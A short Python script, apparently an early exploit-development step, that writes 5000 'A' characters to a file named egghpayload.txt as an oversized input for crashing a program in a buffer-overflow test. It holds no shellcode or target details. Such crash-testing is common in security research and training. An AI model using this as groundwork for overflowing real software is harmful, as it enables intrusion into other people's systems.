#!/usr/bin/python

file2="egghpayload.txt"

egghpayload = "A" * 5000

textfile = open(file2 , 'w')
textfile.write(egghpayload)
textfile.close()

